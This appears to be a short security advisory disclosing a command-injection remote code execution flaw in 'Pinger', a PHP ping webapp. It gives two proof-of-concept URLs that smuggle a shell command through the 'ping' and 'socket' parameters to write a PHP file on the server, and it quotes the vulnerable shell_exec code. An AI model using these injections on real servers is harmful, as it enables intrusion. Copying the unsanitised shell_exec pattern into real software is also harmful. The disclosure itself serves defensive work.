Pinger - Simple Pinging Webapp Remote Code Execution
================================================================================
# Vendor Homepage: https://github.com/wcchandler/pinger
# Software Link: http://ehsansec.ir/apps/pinger-master.zip
# Author: Ehsan Hosseini
# Source: http://ehsansec.ir/advisories/pinger-rce.txt
================================================================================
# Description:
simple, easy to use jQuery frontend to php backend that pings various
devices and changes colors from green to red depending on if device is
up or down.

# PoC :

http://localhost/pinger/ping.php?ping=;echo &#039;<?php phpinfo(); ?>&#039; >info.php
http://localhost/pinger/ping.php?socket=;echo &#039;<?php phpinfo(); ?>&#039; >info.php


# Vulnerabile code:

  if(isset($_GET[&#039;ping&#039;])){
    // if this is ever noticably slower, i&#039;ll pass it stuff when called
    // change the good.xml to config.xml, good is what I use at $WORK
    $xml = simplexml_load_file("config.xml");
    //$xml = simplexml_load_file("good.xml");
    if($_GET[&#039;ping&#039;] == ""){
      $host = "127.0.0.1";
    }else{
      $host = $_GET[&#039;ping&#039;];
    }
    $out = trim(shell_exec(&#039;ping -n -q -c 1 -w &#039;.$xml->backend->timeout
                .&#039; &#039;.$host.&#039; | grep received | awk \&#039;{print $4}\&#039;&#039;));
    $id = str_replace(&#039;.&#039;,&#039;_&#039;,$host);

    if(($out == "1") || ($out == "0")){
      echo json_encode(array("id"=>"h$id","res"=>"$out"));
    }else{
      ## if it returns nothing, assume network is messed up
      echo json_encode(array("id"=>"h$id","res"=>"0"));
    }
  }

  if(isset($_GET[&#039;socket&#039;])){
    $xml = simplexml_load_file("config.xml");
    //$xml = simplexml_load_file("good.xml");
    if($_GET[&#039;socket&#039;] == ""){
      $host = "127.0.0.1 80";
    }else{
      $host = str_replace(&#039;:&#039;,&#039; &#039;,$_GET[&#039;socket&#039;]);
    }
    $out = shell_exec(&#039;nc -v -z -w &#039;.$xml->backend->timeout.&#039; &#039;.$host.&#039; 2>&1&#039;);
    $id = str_replace(&#039;.&#039;,&#039;_&#039;,$host);
    $id = str_replace(&#039; &#039;,&#039;_&#039;,$id);
      echo json_encode(array("id"=>"h$id","res"=>"1"));
    }else{
      ## if it returns nothing, assume network is messed up
      echo json_encode(array("id"=>"h$id","res"=>"0"));
    }
  }

  ?>

================================================================================
# Discovered By : Ehsan Hosseini
================================================================================

